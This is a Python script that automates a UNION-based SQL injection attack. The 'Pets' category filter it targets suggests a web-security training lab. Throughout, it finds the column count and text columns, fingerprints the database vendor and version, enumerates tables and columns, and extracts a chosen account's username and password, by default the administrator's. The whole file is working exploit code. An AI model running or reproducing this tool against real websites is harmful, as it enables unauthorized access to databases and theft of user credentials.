from sre_constants import RANGE
import requests
import sys
import urllib3 
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
path = 'filter?category=Pets'
payload_beginning = "' UNION SELECT "
database_types = ['Oracle', 'Microsoft SQL', 'PostgreSQL', 'MySQL']


def perform_request(url, sql_payload):
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    return soup

def regex_prompt(soup, default, prompt):
    matches = []
    while matches == []:
        regex = input(prompt)
        if regex == '':
            regex = default
        matches = soup.findAll(text=re.compile(r'(?i).*' + regex + '.*'))
        if matches:
            return(matches)
        else:
            print('[-] No Results.')

def selection_menu(list_name, prompt):
        for item in list_name:
            item = '[' + str(list_name.index(item) + 1) + '] ' + item
            item = item.split(' ', 1)
            print(item[0] + ' ' + item[1])
        while list_name:
            item = input(prompt + " (" + list_name[0] + "): ")
            if item == '':
                item = list_name[0]
                return(item)
            elif item.isdigit() == True and int(item) in range(1, len(list_name) + 1):
                item = int(item)
                item -= 1
                item = list_name[item]
                return(item)
            elif item.strip(' "\'') in list_name:
                item = item.strip(' "\'')
                return(item)
            else:
                print('[-] Invalid Entry.')

def exploit_sqli_column_number(url): 
    database_types = [] 
    payload_comment_list = ['--','/*','%23','--%20']
    payload_comments = []
    column_number = []
    for payload_comment in payload_comment_list:
        sql_payload = "'+ORDER+BY+1" + payload_comment
        soup = perform_request(url, sql_payload)
        server_error = soup.find(text=re.compile('.*Server Error.*'))
        if not server_error:
            for column in range(2,50):
                sql_payload = "'+ORDER+BY+%s" %column + payload_comment
                soup = perform_request(url, sql_payload)
                server_error = soup.find(text=re.compile('.*Server Error.*'))
                if server_error:
                    payload_comments.append(payload_comment)
                    column_number.append(column - 1)
                    break
    if column_number and payload_comments:
        for payload_comment in payload_comments:
            if payload_comment == '--':
                database_types

        return column_number, payload_comments
    else:
        print('[-] No Comment Payloads worked.')
        return False, False

def exploit_sqli_string_field(url, column_number, payload_comments):
    for payload_comment in payload_comments:
        string = "'v2F6UA'"
        string_columns = []
        payload_lists = []
        for i in range(1, column_number+1):
            payload_list = ['NULL'] * column_number
            payload_list[i-1] = string
            payload_list = ','.join(payload_list)
            sql_payload = payload_beginning + payload_list + payload_comment
            soup = perform_request(url, sql_payload)
            soup = soup.find(text=re.compile(r'(?i).*' + string.strip("'") + '.*'))
            if soup:
                string_columns.append(i)
                payload_lists.append(payload_list)
            elif payload_comment == '--':
                oracle_payload = ' FROM dual'
                sql_payload = payload_beginning + payload_list + oracle_payload + payload_comment
                soup = perform_request(url, sql_payload)
                soup = soup.find(text=re.compile(r'(?i).*' + string.strip("'") + '.*'))
                if soup:
                    string_columns.append(i)
                    payload_lists.append(payload_list)
        if string_columns and payload_lists:
            return(string, string_columns, payload_lists)
    return (string,False,False)
    
def exploit_sqli_version(url, string, payload_lists, payload_comments):
    for payload_list in payload_lists:
        for payload_comment in payload_comments:
            if payload_comment == '--%20' and '%20' in payload_comment or payload_comment == '%23':
                database_type = 'MySQL'
                payload_middle = payload_list.replace(string,'@@version')
                sql_payload = payload_beginning + payload_middle + payload_comment
                soup = perform_request(url, sql_payload)
                version = soup.find(text=re.compile(r'(?i).*MySQL.*'))
                if version:
                    return(database_type, version)
            elif payload_comment == '/*':
                version_payloads = [['Microsoft SQL','@@version','.*Microsoft\sSQL.*'],['MySQL','@@version','.*MySQL.*'],['PostgreSQL','version()','.*PostgreSQL.*']]
                for version_payload in version_payloads:
                    database_type = version_payload[0]
                    payload_middle = payload_list.replace(string,version_payload[1])
                    sql_payload = payload_beginning + payload_middle + payload_comment
                    soup = perform_request(url, sql_payload)
                    version = soup.find(text=re.compile(version_payload[-1]))
                    if version:
                        return(database_type, version)
            elif payload_comment == '--':
                version_payloads = [['Oracle','banner','+FROM+v$version','.*Oracle\sDatabase.*'],['Oracle','version','+FROM+v$instance','.*Oracle\sDatabase.*'],['Microsoft SQL','@@version','.*Microsoft\sSQL.*'],['PostgreSQL','version()','.*PostgreSQL.*']]
                for version_payload in version_payloads:
                    database_type = version_payload[0]
                    payload_middle = payload_list.replace(string,version_payload[1])
                    if database_type == 'Oracle':
                        payload_end = version_payload[2]
                        sql_payload = payload_beginning + payload_middle + payload_end + payload_comment
                    else:
                        sql_payload = payload_beginning + payload_middle + payload_comment
                    soup = perform_request(url, sql_payload)
                    version = soup.find(text=re.compile(version_payload[-1]))
                    if version:
                        return(database_type, version)
    else:
        database_type = database_types
        return database_type, False

def sqli_user_table(url, string, payload_lists, payload_comments, database_type):
    if (type(database_type)) == str:
        database_types.remove(database_type)
        database_types.insert(0,database_type)
        del database_type
    for payload_list in payload_lists:
        payload_middle = payload_list.replace(string,'table_name')
        for payload_comment in payload_comments:
            for database_type in database_types:
                if database_type == 'Oracle':
                    payload_end = ' FROM all_tables'
                elif database_type == 'Microsoft SQL' or 'PostgreSQL' or 'MySQL':
                    payload_end = ' FROM information_schema.tables'
                sql_payload = payload_beginning + payload_middle + payload_end + payload_comment
                soup = perform_request(url, sql_payload)
                default = 'user'
                prompt = "[*] Search Table Name (%s): " %default
                user_tables = regex_prompt(soup, default, prompt)
                prompt = '[+] Select Table Name'
                user_table = str(selection_menu(user_tables, prompt))
                return(user_table)
    return(False)

def sqli_user_columns(url, string, payload_lists, payload_comments, database_type, user_table):
    for payload_list in payload_lists:
        payload_middle = payload_list.replace(string,'column_name')
        for payload_comment in payload_comments:
            if database_type == 'Oracle':
                payload_end = " FROM all_tab_columns WHERE table_name = '%s'" % user_table
            elif database_type == 'Microsoft SQL' or 'PostgreSQL' or 'MySQL':
                payload_end = " FROM information_schema.columns WHERE table_name = '%s'" % user_table
            sql_payload = payload_beginning + payload_middle + payload_end + payload_comment
            soup = perform_request(url, sql_payload)
            default = 'username'
            prompt = "[*] Search Username Column (%s): " %default
            username_columns = regex_prompt(soup, default, prompt)
            prompt = '[+] Select Username Column'
            username_column = selection_menu(username_columns, prompt)
            default = 'password'
            prompt = "[*] Search Password Column (%s): " %default
            password_columns = regex_prompt(soup, default, prompt)
            prompt = '[+] Select Password Column'
            password_column = selection_menu(password_columns, prompt)
            return(username_column,password_column)
    return(False,False)

def sqli_target_cred(url, string, string_columns, payload_lists, payload_comments, user_table, username_column, password_column):
    string = 'NULL'
    payload_end = " FROM " + user_table
    for string_column in range(len(string_columns)):
        string_columns[string_column] -= 1
    for payload_list in payload_lists:
        payload_list = payload_list.replace(string,'NULL')
        payload_list = payload_list.split(',')
        payload_list[string_columns[0]] = username_column
        payload_list[string_columns[1]] = password_column
        payload_middle = ','.join(payload_list)
        for payload_comment in payload_comments:
            sql_payload = payload_beginning + payload_middle + payload_end + payload_comment
            soup = perform_request(url, sql_payload)
            default = 'admin'
            prompt = "[*] Search Target Username (%s): " %default
            target_usernames = regex_prompt(soup, default, prompt)
            prompt = '[+] Select Target Name'
            target_username = selection_menu(target_usernames, prompt)
            target_password = soup.body.find(text=str(target_username)).parent.findNext('td').contents[0]
            return(target_username, target_password)            
    return(False, False)

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com/" % sys.argv[0])
        sys.exit(-1)
    column_number, payload_comments = exploit_sqli_column_number(url)
    if column_number and payload_comments:
        print("[+] Comment Payload(s): " + ' | '.join(payload_comments))
        print("[+] The number of columns is " + str(column_number[0]) + "." )
        print("[*] Figuring out which column(s) contain text...")
        string, string_columns, payload_lists = exploit_sqli_string_field(url, column_number[0], payload_comments)
        if string and string_columns and payload_lists:
            if len(string_columns) >= 2:
                print("[+] Columns that contain text: " + ', '.join(map(str, string_columns)) + ".")
            else:
                print("[+] Column that contains text: " + string_columns + ".")
            database_type, version = exploit_sqli_version(url, string, payload_lists, payload_comments)
            if version:
                print("[+] " + version)
            else:
                print("[-] Database Version not enumerated.")
            user_table = sqli_user_table(url, string, payload_lists, payload_comments, database_type)
            if user_table:
                print("[+] Using Table Name: %s" % user_table)
                username_column, password_column = sqli_user_columns(url, string, payload_lists, payload_comments, database_type, user_table)
                if username_column and password_column:
                    print("[+] Username Column Name: %s" % username_column)
                    print("[+] Password Column Name: %s" % password_column)
                    target_username, target_password = sqli_target_cred(url, string, string_columns, payload_lists, payload_comments, user_table, username_column, password_column)
                    if target_username:
                        print("[+] The target username is: " + target_username)
                        if target_password:
                            print("[+] The target password is: " + target_password)
                        else:
                            print("[-] Did not find the administrator password.")
                    else:
                        print("[-] Did not find the administrator username.")
                else:
                    print("[-] Did not find the username and/or the password columns.")
            else:
                print("[-] Did not find a user table.")          
        else:
            print("[-] Unable to find a column with string data type.")
    else:
        print("[-] Unable to find number of columns.")